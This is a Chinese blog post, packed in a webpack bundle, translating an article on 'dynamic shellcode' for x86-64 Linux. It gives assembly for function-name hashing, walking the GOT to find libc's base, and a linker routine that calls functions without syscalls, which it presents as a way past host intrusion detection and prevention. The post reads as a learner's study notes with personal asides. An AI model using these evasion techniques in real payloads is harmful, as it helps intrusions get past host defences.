webpackJsonp([44,191],{408:function(n,r){n.exports={rawContent:"\n\n意译：[Shellcode/Dynamic](http://blackhat.life/Dynamic_Shellcode)\n\n动态shellcode是自链接的shellcode，用来规避多种主机层面的防护措施，比如主机入侵检测系统(HIDS)或者主机入侵防护系统(HIPS)。这些措施能阻止传统的null-free shellcode。通过动态shellcode技术，实现比如不包含中断、系统调用或者明文函数字符串等。\n\n[TOC]\n\n## 评价\n\n大多安全设施组件都基于RAM的数据和标记为可执行的内容进行运行时分析。而且，许多系统甚至从内核检查内核中断和系统调用(linux审计工具audit就做这个)。其它也许监视ld-linux中提供给普通应用使用共享库调用的`_ld_runtime_resolve`的运行，`_dl_fixup()`的蹦床(trampoline,确定不是函数式编程？？？？)等。当应用尝试执行不在它们`.text`段的系统调用或中断、或者尝试使用`_ld_runtime_resolve`，`_dl_fixup`,`dl_open`,`dl_close`或者`dl_sym`来导入一个不在它导入表(import talbe)的函数时，会触发许多安全系统的警告。另外，使用比如像`dl_open()`和`dl_sym()`这样的函数需要使用明文字符串。任何一般的分析都能很容易迅速逆向有效载荷，这是传统null-free shellcode的另一个问题。\n\n一个动态shellcode引擎能够解决这些问题。通过避免C调用惯例使用的寄存器，它可以构建允许开发者写出动态自链接代码的链接器(linker)。于是完全不再需要中断或者系统调用，因为链接器能不倚靠操作系统导入函数。另外，函数哈希被用作阻止函数名通过字符串呈现，解决了上面标准null-free shellcode有的问题。\n\n## C调用惯例的影响\n\n通常的系统调用格式或者libc函数调用：\n\n    function_call(%rax) = function(%rdi,  %rsi,  %rdx,  %r10,  %r8,  %r9)\n\n返回值通常置于`rax`中，然而当结构指针被作为参数传递时，在那个参数寄存器中一个指向更改过的结构的指针被返回。\n\n以上陈述显示：写一个链接器时，以下寄存器在没有系统调用的调用之前，不必为函数调用保存。\n\n    %rax, %rbx, %rcx, %rbp, %r11, %r12, %r13, %r14, %r15\n\n大多数寄存器能更改或者被各种libc函数更改，然而`rbx`在libc中被保留为开发者使用。当写一个动态链接器时，函数参数必须被保留，这样开发者能轻易写出动态集成的代码。最后，链接器取`rbx`作为库的基址指针，`rbp`用来哈希函数。这确保了开发者能保持对`rax`,`rdi`,`rsi`,`rdx`,`r10`,`r8`和`r9`的控制。`rcx`寄存器被用来作为指向调用函数标签的指针，也许应在函数调用间被保留。\n\n## 函数哈希\n\n这个功能希望`rdx`是0，`rsi`中是指向字符串的指针。接着它完成字符串的单向32位哈希并保存在`rsi`中。\n\n首先，把被哈希程序(hasher)使用的不是`rsi`的寄存器保留：\n\n    calc_hash:\n\n    preserve_regs:\n        push rax\n        push rdx\n\n`rdx`作为调用哈希程序的代码的零寄存器(zreg/zero register)。可以指通过简单的`push/pop`把`rax`置零来：\n\n    initialize_regs:\n        push rdx\n        pop rax\n\n接着，DF位(directional flag)被清空。这很重要，因为接下来的哈希过程使用了`lodsd`，而有漏洞应用的DF位不确定。\n\n    cld\n\n接着，`al`中的字节和`edx`相加，结果存入`edx`。左移12位(0xc)，当`lodsd`载入的字节是null时，哈希值就计算完毕了。\n\n    calc_hash_loop:\n        lodsb\n        rol edx, 0xc\n        add edx, eax\n        test al, al\n        jnz calc_hash_loop\n\n接着使用push和pop把哈希置入`rsi`：\n\n    calc_done:\n        push rdx\n        pop rsi\n\n最后，恢复保存到寄存器\n\n    restore_regs:\n        pop rdx\n        pop rax\n\n## 遍历到GOT的动态节(dynamic section)\n\n当前执行进程的动态节程序头总是在VMA(Virtual Memory Adress，虚拟内存地址)`0x00400130`。以下是个没有`\\x00`(null-free)的版本：\n\n    _start:\n        push 0x400130ff\n        pop rbx\n        shr ebx, 0x8\n\n指向动态节的指针被抽取，长度被添加到动态节的长度上。GOT(Global Offset Table，全局偏移表)刚好就在动态节后面。通过以这种方式计算偏移量，可以不必从文件头中读取GOT的位置来遍历GOT。这有无数的好处。(译者：不知道有啥好处。。。)\n\n    fast_got:\n        mov rcx, [rbx]\n        add rcx, [rbx+0x10]\n\n### 抽取一个库指针\n\n这个代码从GOT抽取个指向libc中任意函数的指针。比如在`rcx+0x18`地方，有指向`_dl_runtime_resolve`的指针。\n\n    extract_pointer:\n        mov rbx, [rcx+0x20]\n\n现在寻找想要导入的二进制文件的基指针，首先寻找`\\x7fELF`。因为RAM倒着保存信息，使用逆向比较来决定何时逆向循环。\n\n    find_base:\n        dec rbx\n        cmp [rbx], 0x464c457f\n        jne find_base\n\n### 用户定义代码\n\n现在基指针被计算出来，该载入开发者或用户的代码了。为了让调用函数(`invoke_function`)从寄存器中可重用，通过getPC来把调用函数的地址存入`rcx`。\n\n    jmp startup\n\n    __initialize_world:\n        pop rcx\n        jmp _world\n\n    startup:\n        call __initialize_word\n\n    invoke_function:\n        ...\n    _world:\n        ; user-defined code goes here\n\n### 接口\n\n这里开发的运行时链接器能让用户自定的代码从`_world`开始。这个接口让开发者能提供函数哈希到`rbp`并且执行`call [rcx]`代替系统调用。这个例子描述了从内核调用exit(0)到使用链接器的API来调用exit(0)的过程。\n\n以未链接的exit形式开始：\n\n    exit：\n        push 0x3c\n        pop rax\n        xor rdi, rdi\n        syscall\n\n哈希`exit`(上面的相加右移)得到`0x696c4780`\n\n     ✘  ~/Work/project/blackhat/shellcode  cat hash-generator.s \n    BITS 64\n    \n    global _start\n    _start:\n        jmp startup\n    \n    calc_hash:\n    ; accept rsi hold function name.\n    ; rdx=0 first\n    ; return hash in rsi\n    ; use rax, rdx, rsi\n        ; preserve rax&rdx\n        push rax    ; use as accum\n        push rdx    ; zero register\n    \n        initialize_regs:\n            push rdx\n            pop rax ;rax = 0\n            cld; clear zf for lodsb\n    \n            calc_hash_loop:\n                lodsb   ; load one byte from rsi to al\n                rol edx, 0xc    ;right shift 12bits\n                add edx, eax    ;add eax to edx\n                test al, al     ; if al='\\0'\n                jnz calc_hash_loop\n    \n        calc_done:\n            push rdx\n            pop rsi ; move hash in rdx to rsi\n    \n        pop rdx\n        pop rax ; restore rdx&rax\n    ret\n    \n    startup:\n        pop rax ; pointer to calc_hash\n        pop rax ; argc\n        pop rsi ; pointer to argv[]\n    \n        xor rdx, rdx    ;rdx=0\n        call calc_hash\n    \n        push rsi    ; save hash on stack\n        mov rsi, rsp    ; rsi hold pointer to hash now\n    \n        push rdx    ; null\n        mov rcx, rsp    ; rcx hold pointer to null now\n    \n        mov rdi, 0x4\n        loop:\n            ; 倒着复制的\n            dec rdi\n            mov al, [rsi+rdi*1]\n            mov [rcx+rdx*1], al\n            inc rdx\n            cmp rdi, 0  ; gas 竟然不能cmp %rdi, $0....但可以倒过来\n            jnz loop\n    \n        mov rsi, rcx    ;rsi hold pointer to reverse hash\n        inc rdi ; rdi = 1\n        mov rax, rdi    ; rax = 1\n        syscall         ; write(1, reverse hash)\n    \n        mov rax, 0x3c   ; rax=60\n        dec rdi         ; rdi=0\n        syscall         ; exit(0)\n     ~/Work/project/blackhat/shellcode  nasm -felf64 hash-generator.s -o hash-generator.o\n     ~/Work/project/blackhat/shellcode  ld hash-generator.o -o hash-generator\n     ~/Work/project/blackhat/shellcode  ./hash-generator exit|hexdump -C\n    00000000  69 6c 47 80                                       |ilG.|\n    00000004\n\n所以，`_world`这么写\n\n    _world:\n        push 0x696c4780\n        pop rbp ; 正好倒过来，看看hash-generator.s的代码\n        xor rdi, rdi\n        call [rcx]\n\n开发者应该记着当调用那些可能改变寄存器的调用函数时保存`rcx`。或者通过更改`__initialize_world`中pop到的寄存器来移除限制。\n\n### 调用的函数\n\n这个注释是为了防止开发者忘记接口功能：\n\n    ;\n    ;  Takes a function hash in %rbp and base pointer in %rbx\n    ;  >Parses the dynamic program headers of the ELF64 image\n    ;  >Uses ROP to invoke the function on the way back to the\n    ;  -normal return location\n    ;\n    ;  Returns results of function to invoke.\n    ;\n\n所有和libc交互的寄存器和任何可能被链接器使用的寄存器必须被保留，这样它们才能在函数调用时被恢复，`rbp`寄存器被保留两次。这时因为第一次保留在返回前被指向目的函数的指针覆盖。这让shellcode从目的函数返回到开发者定义的函数。\n\n    invoke_function:\n        push rbp\n        push rbp\n        push rdx\n        push rdi\n        push rax\n        push rbx\n        push rsi\n\n将`rdx`赋为0,吧函数哈希放入`rdi`来进行将来的比较\n\n    set_regs:\n        xor rdx, rdx\n        push rbp\n        pop rdi\n\n然后目的库导入的基址指针就放入`rbp`\n\n    copy_base:\n        push rbx\n        pop rbp\n\n需要读取`[rbx+0x130]`四字节，但是添加到八字节的寄存器。\n\n    read_dynamic_section:\n        push 0x4c\n        pop rax\n        add rbx, [rbx + rax * 4]\n\n找到函数导出表，一般叫做`.dynsym`，或者动态符号表。通过遍历头检查动态节的类型。\n\n    check_dynamic_type:\n        add rbx, 0x10\n        cmpb [rbx], 0x5\n        jne check_dynamic_type\n\n一旦ebx指向程序头中正确的位置;放置字符串表的绝对地址到`rax`和动态符号表的绝对地址到`rbx`。\n\n    string_table_found:\n        mov rax, [rbx+0x8]  ; rax是动态字符串表的地址\n        mov rbx, [rbx+0x18] ; rbx是指向符号表的地址\n\n接着，增加到下一个导出，指向字符串的指针被放入`rsi`来哈希\n\n    check_next_hash:\n        add rbx, 0x18   ;下一个条目\n        push rdx\n        pop rsi\n        xor si, [rbx]\n        add rsi, rax\n\n`calc_hash`标签被如上描述方式调用来哈希函数名。\n\n    calc_hash:\n        ...\n\n比较当前导出表的函数哈希和想要导出的函数哈希，如果不匹配则跳到下一次导入：\n\n    check_current_hash:\n        cmp edi, esi\n        jne check_next_hash\n\n一旦哈希被找到，它的函数偏移位于`[rbx+0x8]`四字节。`rdx`被用来作为零寄存器来得到没有`\\x00`的四字节。FIXME(not so) 添加到`rbp`基址指针：\n\n    found_hash:\n        add rbp, [rbx+4*rdx+0x8]\n\n这里，第一个例子中被保留的`rbp`被目的函数的地址覆盖。\n\n    mov [esp+0x30], rbp\n\n最后恢复所有寄存器。\n\n        pop rsi\n        pop rbx\n        pop rax\n        pop rdi\n        pop rdx\n        pop rbp\n    ret\n\n跳到目的函数代码。\n\n### 动态shell\n\n一旦添加链接器，一个115字节的socket重用载荷就变成了268字节的动态载入版本。这里有几种优化的方式，作为读者的练习。。。我得回头看看。。。\n\n算了，我先看看[Load-time relocation of shared libraries](http://eli.thegreenplace.net/2011/08/25/load-time-relocation-of-shared-libraries/)\n\n令上午承蒙翔哥内推，刚填了简历，下午竟然就给我打电话电面了。。。然后就是强行谈及二进制安全被血虐最后被鄙视的过程，哈哈哈。\n\n慢慢看，不把安全作为工作也许是种幸福呢。\n\n毕业前：\n\n- 游戏\n- 画\n\n兴趣：\n\n- 统计学习\n- 二进制安全\n\n工作：\n- ？\n",metaData:{layout:"post",title:"Shellcode/Dynamic",excerpt:"动态shellcode",category:"exploit",tags:["shellcode"],disqus:!0}}}});